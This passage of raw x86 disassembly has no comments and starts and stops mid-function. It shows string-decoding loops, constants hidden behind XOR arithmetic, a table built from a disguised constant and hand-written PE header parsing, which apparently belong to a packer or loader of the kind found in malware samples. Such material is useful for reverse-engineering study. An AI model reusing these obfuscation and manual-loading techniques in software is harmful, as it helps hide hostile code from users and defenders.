  414ad9:	mov    ecx,DWORD PTR [ebp-0xc]
  414adc:	test   eax,eax
  414ade:	je     0x414ae5
  414ae0:	mov    eax,DWORD PTR [ebp-0x4]
  414ae3:	mov    DWORD PTR [eax],edi
  414ae5:	mov    eax,DWORD PTR [ebp-0x10]
  414ae8:	add    DWORD PTR [ebp-0x4],0x4
  414aec:	dec    DWORD PTR [ebp-0x14]
  414aef:	jne    0x414ac5
  414af1:	mov    ebx,DWORD PTR [ebp-0x18]
  414af4:	inc    ebx
  414af5:	mov    DWORD PTR [ebp-0x18],ebx
  414af8:	cmp    ebx,DWORD PTR [ebp-0x8]
  414afb:	jb     0x414a91
  414afd:	pop    esi
  414afe:	pop    ebx
  414aff:	pop    edi
  414b00:	leave  
  414b01:	ret    0x4
  414b04:	push   ebp
  414b05:	mov    ebp,esp
  414b07:	mov    eax,DWORD PTR [ebp+0x8]
  414b0a:	push   esi
  414b0b:	push   DWORD PTR [eax+0x1d8]
  414b11:	lea    esi,[eax+0x198]
  414b17:	mov    eax,DWORD PTR [ebp+0x8]
  414b1a:	call   0x4149b4
  414b1f:	mov    ecx,DWORD PTR [esi]
  414b21:	mov    DWORD PTR [ecx],eax
  414b23:	mov    eax,DWORD PTR [esi]
  414b25:	xor    ecx,ecx
  414b27:	cmp    DWORD PTR [eax],ecx
  414b29:	pop    esi
  414b2a:	setne  cl
  414b2d:	mov    eax,ecx
  414b2f:	pop    ebp
  414b30:	ret    0x4
  414b33:	mov    ecx,DWORD PTR [edi+0x188]
  414b39:	push   ebx
  414b3a:	jmp    0x414b4f
  414b3c:	xor    eax,0x8a89
  414b41:	add    eax,0x3b4c
  414b46:	mov    WORD PTR [ecx],ax
  414b49:	add    ecx,0x2
  414b4c:	add    edx,0x2
  414b4f:	movzx  eax,WORD PTR [edx]
  414b52:	mov    ebx,0x4e3d
  414b57:	cmp    ax,bx
  414b5a:	jne    0x414b3c
  414b5c:	xor    eax,eax
  414b5e:	mov    WORD PTR [ecx],ax
  414b61:	mov    eax,DWORD PTR [edi+0x188]
  414b67:	pop    ebx
  414b68:	ret    
  414b69:	push   edi
  414b6a:	mov    edi,eax
  414b6c:	mov    eax,DWORD PTR [esi+0x188]
  414b72:	shl    edi,0x6
  414b75:	add    eax,edi
  414b77:	jmp    0x414b83
  414b79:	xor    cl,0x71
  414b7c:	sub    cl,0xb
  414b7f:	mov    BYTE PTR [eax],cl
  414b81:	inc    eax
  414b82:	inc    edx
  414b83:	mov    cl,BYTE PTR [edx]
  414b85:	cmp    cl,0x7a
  414b88:	jne    0x414b79
  414b8a:	mov    BYTE PTR [eax],0x0
  414b8d:	mov    eax,DWORD PTR [esi+0x188]
  414b93:	add    eax,edi
  414b95:	pop    edi
  414b96:	ret    
  414b97:	push   ebp
  414b98:	mov    ebp,esp
  414b9a:	sub    esp,0x38
  414b9d:	push   ebx
  414b9e:	mov    ebx,0xf89c85b5
  414ba3:	mov    DWORD PTR [ebp-0x4],ebx
  414ba6:	lea    eax,[ebx-0x3]
  414ba9:	push   esi
  414baa:	mov    DWORD PTR [ebp-0x24],eax
  414bad:	mov    ecx,DWORD PTR [ebp-0x4]
  414bb0:	mov    edx,DWORD PTR [ebp+0x8]
  414bb3:	mov    esi,0x7510896
  414bb8:	push   edi
  414bb9:	xor    ecx,esi
  414bbb:	mov    edi,0x3272dd
  414bc0:	add    ecx,edi
  414bc2:	cmp    edx,ecx
  414bc4:	je     0x414d32
  414bca:	mov    ecx,DWORD PTR [ebp-0x4]
  414bcd:	mov    edx,DWORD PTR [ebp+0xc]
  414bd0:	xor    ecx,esi
  414bd2:	add    ecx,edi
  414bd4:	cmp    edx,ecx
  414bd6:	je     0x414d32
  414bdc:	mov    ecx,DWORD PTR [ebp+0x10]
  414bdf:	mov    DWORD PTR [ebp-0x18],ecx
  414be2:	mov    ecx,DWORD PTR [ebp+0xc]
  414be5:	mov    DWORD PTR [ebp-0x14],ecx
  414be8:	mov    ecx,DWORD PTR [ebp+0x8]
  414beb:	mov    DWORD PTR [ebp-0x1c],0xf89c8508
  414bf2:	mov    DWORD PTR [ebp-0x20],eax
  414bf5:	mov    DWORD PTR [ebp-0x10],ebx
  414bf8:	mov    DWORD PTR [ebp+0xc],eax
  414bfb:	mov    DWORD PTR [ebp+0x10],0xf89c85b3
  414c02:	mov    eax,DWORD PTR [ebp+0xc]
  414c05:	mov    DWORD PTR [ebp-0xc],ecx
  414c08:	xor    eax,esi
  414c0a:	mov    ecx,0xffcd8d23
  414c0f:	sub    ecx,eax
  414c11:	add    ecx,DWORD PTR [ebp-0x14]
  414c14:	mov    DWORD PTR [ebp+0x8],ecx
  414c17:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  414c1e:	jmp    0x414d22
  414c23:	mov    eax,DWORD PTR [ebp+0xc]
  414c26:	mov    ecx,DWORD PTR [ebp+0xc]
  414c29:	xor    eax,esi
  414c2b:	xor    ecx,esi
  414c2d:	lea    ecx,[eax+ecx*1+0x64e5ba]
  414c34:	mov    eax,DWORD PTR [ebp+0x8]
  414c37:	xor    edx,edx
  414c39:	div    ecx
  414c3b:	mov    eax,DWORD PTR [ebp+0x10]
  414c3e:	mov    ecx,DWORD PTR [ebp+0xc]
  414c41:	xor    eax,esi
  414c43:	xor    ecx,esi
  414c45:	sub    eax,ecx
  414c47:	cmp    edx,eax
  414c49:	jne    0x414cde
  414c4f:	mov    eax,DWORD PTR [ebp+0x8]
  414c52:	add    eax,DWORD PTR [ebp-0xc]
  414c55:	mov    dl,BYTE PTR [eax]
  414c57:	mov    eax,DWORD PTR [ebp-0x10]
  414c5a:	mov    ecx,DWORD PTR [ebp-0x8]
  414c5d:	xor    eax,esi
  414c5f:	xor    ecx,esi
  414c61:	add    eax,edi
  414c63:	add    ecx,edi
  414c65:	cmp    eax,ecx
  414c67:	jae    0x414caf
  414c69:	lea    ecx,[eax-0x3272dd]
  414c6f:	mov    DWORD PTR [ebp-0x4],ecx
  414c72:	mov    ebx,DWORD PTR [ebp-0x4]
  414c75:	xor    ebx,esi
  414c77:	add    ebx,0x7f55d8f3
  414c7d:	lea    ecx,[ebp+eax*4-0x38]
  414c81:	mov    DWORD PTR [ecx],ebx
  414c83:	mov    ebx,DWORD PTR [ecx]
  414c85:	cmp    ebx,0x244ecbd0
  414c8b:	jbe    0x414c95
  414c8d:	add    DWORD PTR [ecx],0x405fc11
  414c93:	jmp    0x414c9b
  414c95:	add    DWORD PTR [ecx],0xfdaf43ef
  414c9b:	mov    ecx,DWORD PTR [ebp-0x8]
  414c9e:	xor    ecx,esi
  414ca0:	inc    eax
  414ca1:	inc    DWORD PTR [ebp-0x4]
  414ca4:	add    ecx,edi
  414ca6:	cmp    eax,ecx
  414ca8:	jb     0x414c72
  414caa:	mov    ebx,0xf89c85b5
  414caf:	mov    eax,DWORD PTR [ebp-0x18]
  414cb2:	test   eax,eax
  414cb4:	jne    0x414cbe
  414cb6:	xor    dl,0x71
  414cb9:	sub    dl,0xb
  414cbc:	jmp    0x414cd4
  414cbe:	mov    eax,DWORD PTR [ebp-0x1c]
  414cc1:	xor    al,0x96
  414cc3:	mov    cl,0x23
  414cc5:	sub    cl,al
  414cc7:	add    dl,cl
  414cc9:	mov    ecx,DWORD PTR [ebp-0x20]
  414ccc:	xor    cl,0x96
  414ccf:	sub    cl,0x23
  414cd2:	ror    dl,cl
  414cd4:	xor    eax,eax
  414cd6:	mov    eax,DWORD PTR [ebp+0x8]
  414cd9:	add    eax,DWORD PTR [ebp-0xc]
  414cdc:	mov    BYTE PTR [eax],dl
  414cde:	mov    eax,DWORD PTR [ebp+0x8]
  414ce1:	mov    ecx,DWORD PTR [ebp-0x10]
  414ce4:	sub    eax,edi
  414ce6:	xor    eax,esi
  414ce8:	cmp    eax,ecx
  414cea:	jne    0x414d10
  414cec:	mov    eax,DWORD PTR [ebp+0x10]
  414cef:	mov    ecx,DWORD PTR [ebp+0xc]
  414cf2:	xor    eax,esi
  414cf4:	xor    ecx,esi
  414cf6:	sub    eax,ecx
  414cf8:	sub    eax,edi
  414cfa:	xor    eax,esi
  414cfc:	mov    DWORD PTR [ebp+0x10],eax
  414cff:	mov    eax,DWORD PTR [ebp+0xc]
  414d02:	xor    eax,esi
  414d04:	mov    ecx,0xffcd8d23
  414d09:	sub    ecx,eax
  414d0b:	add    ecx,DWORD PTR [ebp-0x14]
  414d0e:	jmp    0x414d1f
  414d10:	mov    eax,DWORD PTR [ebp+0xc]
  414d13:	xor    eax,esi
  414d15:	mov    ecx,0xffcd8d23
  414d1a:	sub    ecx,eax
  414d1c:	add    ecx,DWORD PTR [ebp+0x8]
  414d1f:	mov    DWORD PTR [ebp+0x8],ecx
  414d22:	mov    eax,DWORD PTR [ebp+0x10]
  414d25:	cmp    eax,ebx
  414d27:	jne    0x414c23
  414d2d:	mov    eax,DWORD PTR [ebp-0x24]
  414d30:	jmp    0x414d35
  414d32:	mov    eax,DWORD PTR [ebp-0x4]
  414d35:	xor    eax,esi
  414d37:	add    eax,edi
  414d39:	pop    edi
  414d3a:	pop    esi
  414d3b:	pop    ebx
  414d3c:	leave  
  414d3d:	ret    0xc
  414d40:	push   ebp
  414d41:	mov    ebp,esp
  414d43:	sub    esp,0x14
  414d46:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  414d4d:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  414d54:	mov    eax,DWORD PTR [ebx]
  414d56:	mov    DWORD PTR [ebp-0x8],eax
  414d59:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  414d60:	push   esi
  414d61:	push   edi
  414d62:	mov    DWORD PTR [ebp-0x14],0xead718d5
  414d69:	mov    edi,DWORD PTR [ebp-0x4]
  414d6c:	mov    ecx,DWORD PTR [ebp-0x10]
  414d6f:	mov    eax,0x7510896
  414d74:	xor    edi,eax
  414d76:	mov    edx,0x3272dd
  414d7b:	xor    ecx,eax
  414d7d:	add    edi,edx
  414d7f:	add    ecx,edx
  414d81:	imul   edi,ecx
  414d84:	jmp    0x414dcc
  414d86:	mov    ecx,DWORD PTR [ebp-0x8]
  414d89:	mov    esi,DWORD PTR [ebp-0x4]
  414d8c:	xor    ecx,eax
  414d8e:	xor    esi,eax
  414d90:	add    ecx,edx
  414d92:	add    esi,edx
  414d94:	test   esi,ecx
  414d96:	mov    esi,DWORD PTR [ebp-0x8]
  414d99:	mov    ecx,DWORD PTR [ebp-0x4]
  414d9c:	je     0x414db3
  414d9e:	xor    ecx,eax
  414da0:	xor    esi,eax
  414da2:	add    ecx,edx
  414da4:	add    esi,edx
  414da6:	shr    esi,cl
  414da8:	mov    ecx,DWORD PTR [ebp-0x14]
  414dab:	xor    ecx,eax
  414dad:	add    ecx,edx
  414daf:	xor    esi,ecx
  414db1:	jmp    0x414dbd
  414db3:	xor    esi,eax
  414db5:	xor    ecx,eax
  414db7:	add    esi,edx
  414db9:	add    ecx,edx
  414dbb:	shr    esi,cl
  414dbd:	mov    DWORD PTR [ebp-0x8],esi
  414dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  414dc3:	xor    ecx,eax
  414dc5:	lea    edi,[edi+ecx*1+0x3272dd]
  414dcc:	mov    ecx,DWORD PTR [ebp-0xc]
  414dcf:	mov    esi,DWORD PTR [ebp-0x4]
  414dd2:	xor    esi,eax
  414dd4:	xor    ecx,eax
  414dd6:	sub    ecx,esi
  414dd8:	cmp    edi,ecx
  414dda:	jbe    0x414d86
  414ddc:	mov    eax,DWORD PTR [ebp-0x8]
  414ddf:	pop    edi
  414de0:	mov    DWORD PTR [ebx],eax
  414de2:	mov    eax,DWORD PTR [ebp-0x8]
  414de5:	pop    esi
  414de6:	leave  
  414de7:	ret    
  414de8:	push   ebp
  414de9:	mov    ebp,esp
  414deb:	sub    esp,0x420
  414df1:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  414df8:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  414dff:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  414e06:	push   ebx
  414e07:	mov    DWORD PTR [ebp-0x1c],0xf89c85b4
  414e0e:	mov    eax,DWORD PTR [ebp-0x14]
  414e11:	push   esi
  414e12:	mov    esi,0x7510896
  414e17:	push   edi
  414e18:	xor    eax,esi
  414e1a:	mov    edi,0x3272dd
  414e1f:	add    eax,edi
  414e21:	mov    DWORD PTR [ebp-0x8],eax
  414e24:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  414e2b:	mov    DWORD PTR [ebp-0x4],0xead718d5
  414e32:	mov    DWORD PTR [ebp-0x10],0x8
  414e39:	mov    ecx,ecx
  414e3b:	mov    eax,DWORD PTR [ebp-0xc]
  414e3e:	mov    ecx,DWORD PTR [ebp-0x14]
  414e41:	xor    eax,esi
  414e43:	xor    ecx,esi
  414e45:	add    eax,edi
  414e47:	add    ecx,edi
  414e49:	imul   eax,ecx
  414e4c:	jmp    0x414e7f
  414e4e:	mov    eax,DWORD PTR [ebp-0x4]
  414e51:	sub    eax,edi
  414e53:	xor    eax,esi
  414e55:	mov    DWORD PTR [ebp-0x8],eax
  414e58:	lea    ebx,[ebp-0x8]
  414e5b:	call   0x414d40
  414e60:	mov    DWORD PTR [ebp-0x8],eax
  414e63:	mov    eax,DWORD PTR [ebp-0x8]
  414e66:	mov    ecx,DWORD PTR [ebp-0x4]
  414e69:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  414e70:	mov    eax,DWORD PTR [ebp-0xc]
  414e73:	mov    ecx,DWORD PTR [ebp-0x4]
  414e76:	xor    eax,esi
  414e78:	lea    eax,[eax+ecx*1+0x3272dd]
  414e7f:	mov    DWORD PTR [ebp-0x4],eax
  414e82:	mov    eax,DWORD PTR [ebp-0x18]
  414e85:	mov    ecx,DWORD PTR [ebp-0xc]
  414e88:	xor    ecx,esi
  414e8a:	xor    eax,esi
  414e8c:	sub    eax,ecx
  414e8e:	mov    ecx,DWORD PTR [ebp-0x4]
  414e91:	cmp    ecx,eax
  414e93:	jbe    0x414e4e
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	xor    eax,esi
  414e9a:	add    eax,edi
  414e9c:	mov    DWORD PTR [ebp-0x8],eax
  414e9f:	mov    DWORD PTR [ebp-0x18],0xf89c86b4
  414ea6:	mov    ebx,ebx
  414ea8:	jmp    0x414f0b
  414eaa:	mov    ecx,DWORD PTR [ebp-0x20]
  414ead:	mov    eax,DWORD PTR [ebp-0x8]
  414eb0:	xor    ecx,esi
  414eb2:	add    ecx,edi
  414eb4:	shr    eax,cl
  414eb6:	mov    DWORD PTR [ebp-0x4],eax
  414eb9:	mov    eax,DWORD PTR [ebp+0x8]
  414ebc:	mov    cl,BYTE PTR [eax]
  414ebe:	mov    BYTE PTR [ebp+0xb],cl
  414ec1:	mov    cl,BYTE PTR [ebp+0xb]
  414ec4:	mov    edx,DWORD PTR [ebp-0x8]
  414ec7:	movzx  ecx,cl
  414eca:	xor    ecx,edx
  414ecc:	mov    DWORD PTR [ebp+0x8],ecx
  414ecf:	mov    ecx,DWORD PTR [ebp-0x18]
  414ed2:	mov    edx,DWORD PTR [ebp+0x8]
  414ed5:	xor    ecx,esi
  414ed7:	add    ecx,edi
  414ed9:	and    ecx,edx
  414edb:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  414ee2:	mov    edx,DWORD PTR [ebp-0x4]
  414ee5:	xor    ecx,edx
  414ee7:	mov    DWORD PTR [ebp-0x8],ecx
  414eea:	mov    ecx,DWORD PTR [ebp-0xc]
  414eed:	xor    ecx,esi
  414eef:	lea    eax,[eax+ecx*1+0x3272dd]
  414ef6:	mov    DWORD PTR [ebp+0x8],eax
  414ef9:	mov    eax,DWORD PTR [ebp-0xc]
  414efc:	xor    eax,esi
  414efe:	mov    ecx,0xffcd8d23
  414f03:	sub    ecx,eax
  414f05:	add    ecx,DWORD PTR [ebp-0x10]
  414f08:	mov    DWORD PTR [ebp-0x10],ecx
  414f0b:	mov    eax,DWORD PTR [ebp-0x14]
  414f0e:	mov    ecx,DWORD PTR [ebp-0x10]
  414f11:	xor    eax,esi
  414f13:	add    eax,edi
  414f15:	cmp    ecx,eax
  414f17:	jne    0x414eaa
  414f19:	mov    eax,DWORD PTR [ebp-0x1c]
  414f1c:	mov    ecx,DWORD PTR [ebp-0x8]
  414f1f:	xor    eax,esi
  414f21:	add    eax,edi
  414f23:	pop    edi
  414f24:	pop    esi
  414f25:	xor    eax,ecx
  414f27:	pop    ebx
  414f28:	leave  
  414f29:	ret    0x4
  414f2c:	push   ebp
  414f2d:	mov    ebp,esp
  414f2f:	mov    eax,DWORD PTR [ebp+0x1c]
  414f32:	mov    ecx,DWORD PTR [ebp+0x8]
  414f35:	mov    edx,DWORD PTR [ebp+0x10]
  414f38:	mov    eax,DWORD PTR [eax+0x190]
  414f3e:	mov    eax,DWORD PTR [eax]
  414f40:	sub    esp,0x64
  414f43:	push   ebx
  414f44:	push   esi
  414f45:	push   edi
  414f46:	mov    edi,0x7510896
  414f4b:	xor    ecx,edi
  414f4d:	mov    ebx,0x3272dd
  414f52:	add    ecx,ebx
  414f54:	cmp    ecx,edx
  414f56:	jne    0x414f67
  414f58:	or     DWORD PTR ds:0x3750c3f,0x4263eb0c
  414f62:	jmp    0x415464
  414f67:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6a:	mov    esi,DWORD PTR [ebp+0x14]
  414f6d:	mov    edx,DWORD PTR [esi]
  414f6f:	xor    ecx,edi
  414f71:	add    ecx,ebx
  414f73:	cmp    edx,ecx
  414f75:	je     0x41541f
  414f7b:	mov    ecx,DWORD PTR [ebp+0x1c]
  414f7e:	mov    DWORD PTR [ebp-0x1c],eax
  414f81:	mov    DWORD PTR [ebp+0x1c],ecx
  414f84:	mov    ecx,DWORD PTR [ebp+0x18]
  414f87:	mov    eax,DWORD PTR [esi]
  414f89:	mov    DWORD PTR [ebp-0x20],eax
  414f8c:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  414f93:	mov    edx,0xf89c85b2
  414f98:	mov    DWORD PTR [ebp-0x8],edx
  414f9b:	mov    eax,DWORD PTR [ebp+0x1c]
  414f9e:	mov    DWORD PTR [ebp+0x1c],eax
  414fa1:	mov    eax,DWORD PTR [ebp+0x1c]
  414fa4:	mov    eax,DWORD PTR [eax+0x190]
  414faa:	mov    eax,DWORD PTR [eax]
  414fac:	mov    DWORD PTR [ebp-0x24],ecx
  414faf:	mov    ecx,DWORD PTR [ebp+0x1c]
  414fb2:	mov    ecx,DWORD PTR [ecx+0x190]
  414fb8:	mov    ecx,DWORD PTR [ecx]
  414fba:	add    ecx,DWORD PTR [eax+0x3c]
  414fbd:	mov    DWORD PTR [ebp+0x10],ecx
  414fc0:	mov    eax,DWORD PTR [ebp+0x8]
  414fc3:	xor    eax,edi
  414fc5:	add    eax,ebx
  414fc7:	mov    DWORD PTR [ebp-0x4],eax
  414fca:	mov    eax,DWORD PTR [ebp+0x8]
  414fcd:	xor    eax,edi
  414fcf:	add    eax,ebx
  414fd1:	mov    DWORD PTR [ebp+0x18],eax
  414fd4:	mov    eax,DWORD PTR [ebp+0x10]
  414fd7:	mov    eax,DWORD PTR [eax+0x50]
  414fda:	sub    eax,0xc
  414fdd:	mov    DWORD PTR [ebp-0x28],eax
  414fe0:	mov    eax,DWORD PTR [ebp+0x10]
  414fe3:	mov    eax,DWORD PTR [eax+0x38]
  414fe6:	mov    ecx,DWORD PTR [ebp+0x10]
  414fe9:	dec    eax
  414fea:	test   DWORD PTR [ecx+0x54],eax
  414fed:	mov    eax,DWORD PTR [ebp+0x10]
  414ff0:	je     0x41500a
  414ff2:	mov    eax,DWORD PTR [eax+0x38]
  414ff5:	mov    ecx,DWORD PTR [ebp+0x10]
  414ff8:	mov    ecx,DWORD PTR [ecx+0x54]
  414ffb:	dec    eax
  414ffc:	not    eax
  414ffe:	and    ecx,eax
  415000:	mov    eax,DWORD PTR [ebp+0x10]
  415003:	mov    eax,DWORD PTR [eax+0x38]
  415006:	add    eax,ecx
  415008:	jmp    0x41500d
  41500a:	mov    eax,DWORD PTR [eax+0x54]
  41500d:	mov    DWORD PTR [ebp+0x1c],eax
  415010:	mov    eax,DWORD PTR [ebp+0x8]
  415013:	xor    eax,edi
  415015:	add    eax,ebx
  415017:	mov    DWORD PTR [ebp+0x18],eax
  41501a:	mov    eax,DWORD PTR [ebp+0x8]
  41501d:	xor    eax,edi
  41501f:	add    eax,ebx
  415021:	mov    DWORD PTR [ebp+0x18],eax
  415024:	mov    eax,DWORD PTR [ebp+0x8]
  415027:	mov    ecx,DWORD PTR [ebp-0x24]
  41502a:	xor    eax,edi
  41502c:	add    eax,ebx
  41502e:	mov    DWORD PTR [ecx],eax
  415030:	mov    DWORD PTR [ebp+0x18],edx
  415033:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  41503a:	mov    DWORD PTR [ebp+0x18],0xf89c85b0
  415041:	mov    DWORD PTR [ebp+0x18],0xf89c85b1
  415048:	mov    eax,DWORD PTR [ebp-0x8]
  41504b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41504e:	xor    eax,edi
  415050:	add    eax,ebx
  415052:	imul   eax,ecx
  415055:	mov    ecx,DWORD PTR [ebp+0x8]
  415058:	mov    edx,DWORD PTR [ebp-0x28]
  41505b:	xor    ecx,edi
  41505d:	lea    ecx,[ecx+edx*1+0x3272dd]
  415064:	cmp    eax,ecx
  415066:	jae    0x415418
  41506c:	mov    eax,DWORD PTR [ebp+0x8]
  41506f:	xor    eax,edi
  415071:	add    eax,ebx
  415073:	mov    DWORD PTR [ebp+0x18],eax
  415076:	mov    eax,DWORD PTR [ebp+0x1c]
  415079:	add    eax,DWORD PTR [ebp-0x1c]
  41507c:	mov    DWORD PTR [ebp-0x4],eax
  41507f:	push   DWORD PTR [ebp-0x4]
  415082:	mov    esi,DWORD PTR [ebp-0x1c]
  415085:	mov    ecx,DWORD PTR [ebp+0x10]
  415088:	call   0x41416e
  41508d:	mov    DWORD PTR [ebp+0xc],eax
  415090:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  415097:	mov    eax,DWORD PTR [ebp-0x18]
  41509a:	xor    eax,edi
  41509c:	add    eax,ebx
  41509e:	push   eax
  41509f:	lea    eax,[ebp-0x40]
  4150a2:	push   eax
  4150a3:	call   0x414779
  4150a8:	mov    eax,DWORD PTR [ebp+0xc]
  4150ab:	test   eax,eax
  4150ad:	je     0x4150fd
  4150af:	mov    eax,DWORD PTR [ebp-0x18]
  4150b2:	xor    eax,edi
  4150b4:	add    eax,ebx
  4150b6:	push   eax
  4150b7:	push   DWORD PTR [ebp+0xc]
  4150ba:	lea    eax,[ebp-0x40]
  4150bd:	push   eax
  4150be:	call   0x414620
  4150c3:	mov    eax,DWORD PTR [ebp-0x4]
  4150c6:	mov    DWORD PTR [ebp-0x18],eax
  4150c9:	mov    eax,DWORD PTR [ebp-0x18]
  4150cc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4150cf:	sub    eax,ecx
  4150d1:	mov    DWORD PTR [ebp-0x18],eax
  4150d4:	mov    eax,DWORD PTR [ebp+0xc]
  4150d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4150da:	mov    eax,DWORD PTR [eax+0x10]
  4150dd:	add    eax,DWORD PTR [ecx+0xc]
  4150e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4150e3:	cmp    ecx,eax
  4150e5:	jb     0x4150fd
  4150e7:	mov    eax,DWORD PTR [ebp+0xc]
  4150ea:	mov    eax,DWORD PTR [eax+0xc]
  4150ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4150f0:	add    eax,DWORD PTR [ecx+0x8]
  4150f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4150f6:	sub    eax,ecx
  4150f8:	jmp    0x4153eb
  4150fd:	push   0xc
  4150ff:	push   DWORD PTR [ebp-0x4]
  415102:	lea    eax,[ebp-0x4c]
  415105:	push   eax
  415106:	call   0x414620
  41510b:	mov    eax,0xf89c85b5
  415110:	mov    DWORD PTR [ebp-0x2c],eax
  415113:	mov    DWORD PTR [ebp-0x30],0xf89c85b2
  41511a:	mov    DWORD PTR [ebp-0x34],0xf89c85b3
  415121:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  415128:	lea    ecx,[ebp-0x2c]
  41512b:	mov    DWORD PTR [ebp-0xc],ecx
  41512e:	lea    ecx,[ebp-0x30]
  415131:	mov    DWORD PTR [ebp-0x10],ecx
  415134:	lea    ecx,[ebp-0x34]
  415137:	mov    DWORD PTR [ebp+0xc],ecx
  41513a:	lea    ecx,[ebp-0x38]
  41513d:	mov    DWORD PTR [ebp-0x14],ecx
  415140:	mov    ecx,DWORD PTR [ebp+0x8]
  415143:	xor    ecx,edi
  415145:	add    ecx,ebx
  415147:	mov    DWORD PTR [ebp-0x18],ecx
  41514a:	jmp    0x415346
  41514f:	cmp    eax,0xf89c85b3
  415154:	je     0x415358
  41515a:	mov    ecx,DWORD PTR [ebp-0x8]
  41515d:	xor    ecx,edi
  41515f:	mov    esi,eax
  415161:	add    ecx,ebx
  415163:	mov    DWORD PTR [ebp+0x18],ecx
  415166:	mov    eax,DWORD PTR [ebp-0x18]
  415169:	xor    esi,edi
  41516b:	lea    eax,[eax+esi*1+0x3272dd]
  415172:	mov    DWORD PTR [ebp-0x18],eax
  415175:	mov    eax,DWORD PTR [ebp-0x8]
  415178:	mov    ecx,DWORD PTR [ebp-0x18]
  41517b:	xor    eax,edi
  41517d:	add    eax,ebx
  41517f:	cmp    ecx,eax
  415181:	jne    0x415196
  415183:	mov    eax,DWORD PTR [ebp+0x8]
  415186:	xor    eax,edi
  415188:	add    eax,ebx
  41518a:	push   eax
  41518b:	push   0xc
  41518d:	lea    eax,[ebp-0x4c]
  415190:	push   eax
  415191:	call   0x414b97
  415196:	mov    eax,DWORD PTR [ebp-0xc]
  415199:	mov    eax,DWORD PTR [eax]
  41519b:	xor    eax,edi
  41519d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151a7:	xor    ecx,edi
  4151a9:	movzx  eax,al
  4151ac:	add    ecx,ebx
  4151ae:	cmp    eax,ecx
  4151b0:	je     0x41532e
  4151b6:	mov    eax,DWORD PTR [ebp-0x10]
  4151b9:	mov    eax,DWORD PTR [eax]
  4151bb:	xor    eax,edi
  4151bd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151c7:	xor    ecx,edi
  4151c9:	movzx  eax,al
  4151cc:	add    ecx,ebx
  4151ce:	cmp    eax,ecx
  4151d0:	je     0x41532e
  4151d6:	mov    eax,DWORD PTR [ebp+0xc]
  4151d9:	mov    eax,DWORD PTR [eax]
  4151db:	xor    eax,edi
  4151dd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151e7:	xor    ecx,edi
  4151e9:	movzx  eax,al
  4151ec:	add    ecx,ebx
  4151ee:	cmp    eax,ecx
  4151f0:	je     0x41532e
  4151f6:	mov    eax,DWORD PTR [ebp-0x14]
  4151f9:	mov    eax,DWORD PTR [eax]
  4151fb:	xor    eax,edi
  4151fd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415204:	mov    ecx,DWORD PTR [ebp+0x8]
  415207:	xor    ecx,edi
  415209:	movzx  eax,al
  41520c:	add    ecx,ebx
  41520e:	cmp    eax,ecx
  415210:	je     0x41532e
  415216:	mov    eax,DWORD PTR [ebp-0x10]
  415219:	mov    eax,DWORD PTR [eax]
  41521b:	xor    eax,edi
  41521d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415224:	mov    ecx,DWORD PTR [ebp-0xc]
  415227:	mov    ecx,DWORD PTR [ecx]
  415229:	xor    ecx,edi
  41522b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415232:	xor    al,cl
  415234:	mov    ecx,DWORD PTR [ebp+0xc]
  415237:	mov    ecx,DWORD PTR [ecx]
  415239:	xor    ecx,edi
  41523b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415242:	or     al,cl
  415244:	mov    ecx,DWORD PTR [ebp-0xc]
  415247:	mov    ecx,DWORD PTR [ecx]
  415249:	xor    ecx,edi
  41524b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415252:	cmp    cl,al
  415254:	jne    0x41532e
  41525a:	mov    eax,DWORD PTR [ebp+0xc]
  41525d:	mov    eax,DWORD PTR [eax]
  41525f:	xor    eax,edi
  415261:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415268:	mov    ecx,DWORD PTR [ebp-0x10]
  41526b:	mov    ecx,DWORD PTR [ecx]
  41526d:	xor    ecx,edi
  41526f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415276:	xor    al,cl
  415278:	mov    ecx,DWORD PTR [ebp-0x14]
  41527b:	mov    ecx,DWORD PTR [ecx]
  41527d:	xor    ecx,edi
  41527f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415286:	or     al,cl
  415288:	mov    ecx,DWORD PTR [ebp-0x10]
  41528b:	mov    ecx,DWORD PTR [ecx]
  41528d:	xor    ecx,edi
  41528f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415296:	cmp    cl,al
  415298:	jne    0x41532e
  41529e:	mov    eax,DWORD PTR [ebp-0x14]
  4152a1:	mov    eax,DWORD PTR [eax]
  4152a3:	xor    eax,edi
  4152a5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	xor    ecx,edi
